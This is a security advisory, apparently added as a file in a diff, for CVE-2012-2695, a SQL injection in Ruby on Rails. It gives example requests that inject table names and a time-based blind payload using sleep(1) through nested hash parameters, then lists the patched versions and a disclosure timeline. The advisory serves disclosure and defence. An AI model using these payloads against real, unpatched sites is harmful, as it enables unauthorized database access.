@@ -1,0 +1,108 @@
+[CONVISO-12-001] - Ruby on Rails SQL Injection
+
+1. Advisory Information
+    Conviso Advisory ID: CONVISO-12-001
+    CVE ID: CVE-2012-2695
+    CVSS v2: 5.8, (AV:N/AC:M/Au:N/C:P/I:P/A:N)
+    Date: 2012-06-20
+
+2. Affected Components
+    All versions.
+
+3. Description
+    Ruby on Rails [1] is a very popular and commonly used web framework. It is self-described as "an
+    open-source web framework that's optimized for programmer happiness and sustainable
+    productivity. It lets you write beautiful code by favoring convention over configuration". A SQL
+    Injection [2] vulnerability have been found on it that affected all versions.
+
+4. Details
+    The vulnerabilities found are actually two variants of the CVE-2012-2661 case. We will cover
+    them later. First let's see the original vulnerability fixed on CVE-2012-2661. This
+    vulnerability occurred during the processing of code like "Post.where(:id => params[:id]).all".
+    In this case, the attacker was able to change the query by manipulating the hash to include any
+    table/column pair.
+
+    Example:
+
+    ---
+        Request: controller?id=123
+        Query: SELECT `posts`.* FROM `posts` WHERE `posts`.`id` = '123'
+
+        Request: controller?id[table.column]=123
+        Query: SELECT `posts`.* FROM `posts` WHERE `table`.`column` = '123'
+    ---
+
+
+    After the release of the patches for CVE-2012-2661, we did some investigation and still were
+    able to exploit the same piece of code with two different variants. The first one was simply a
+    small change in the way the hash is passed.
+
+    Example:
+    ---
+        Request: controller?id=123
+        Query: SELECT `posts`.* FROM `posts` WHERE `posts`.`id` = '123'
+
+        Request: controller?id[table][column]=123
+        Query: SELECT `posts`.* FROM `posts` WHERE `table`.`column` = '123'
+    ---
+
+
+    And the second one exploited a flaw which allowed the attacker to specify the database name to
+    be used in a SHOW TABLES query. Since the name was user-supplied and not quoted, we were able to
+    execute a Blind SQL Injection (tested on MySQL) and an Error-Based SQL Injection in case Rails
+    is misconfigured to exhibit the exception/stacktrace pages. There is also a blog [2] that talks
+    about this case.
+
+    Example:
+    ---
+        Request: controller?id=123
+        Query: SELECT `posts`.* FROM `posts` WHERE `posts`.`id` = '123'
+
+        Request: controller?id[mysql%20where%20(select%200)%20or%20sleep(1).xxx][yyy]=123
+        Queries:
+
+        SHOW TABLES
+        SHOW TABLES IN mysql where (select 0) or sleep(1)
+        (...)
+        SELECT `posts`.* FROM `posts` WHERE `mysql where (select 0) or sleep(1)`.`xxx`.`yyy` = '123'
+    ---
+
+
+
+5. Solution
+    Update Ruby on Rails to the fixed versions 3.2.6, 3.1.6, 3.0.14 or apply the patches.
+
+6. Credits
+    Gabriel Quadros <gquadros@conviso.com.br>
+
+7. Report Timeline
+    Jun 07, 2012 - Conviso Security Labs sends a brief technical report to Rails team.
+    Jun 07, 2012 - The Rails team acknowledges the vulnerability report and informs that the patches
+    will be available in up to two days.
+    Jun 08, 2012 - The Rails team provides the patches to be tested by all researchers that
+    independently reported the vulnerability.
+    Jun 09, 2012 - Conviso Security Labs confirms that the patches are Ok.
+    Jun 12, 2012 - The Rails team releases an advisory and patches. [3] Rails 3.2.6, 3.1.6, 3.0.14
+    are released.
+    Jun 20, 2012 - Advisory CONVISO-12-001 is published.
+
+8. References
+    [1] http://rubyonrails.org
+    [2] https://www.owasp.org/index.php/SQL_injection
+    [3] http://seclists.org/oss-sec/2012/q2/504
+
+9. About Conviso
+    Conviso is a consulting company specialized on application security. Our values are based on the
+    allocation of the adequate competencies on the field, a clear and direct speech with the market,
+    collaboration and partnership with our customers and business partners and constant investments
+    on methodology and research improvement. For more information about our company and services
+    provided, please check our website at www.conviso.com.br.
+
+10. Copyright and Disclaimer
+    The information in this advisory is Copyright 2012 Conviso Application Security S/A and provided
+    so that the society can understand the risk they may be facing by running affected software,
+    hardware or other components used on their systems. In case you wish to copy information from
+    this advisory, you must either copy all of it or refer to this document (including our URL). No
+    guarantee is provided for the accuracy of this information, or damage you may cause your systems
+    in testing.
+
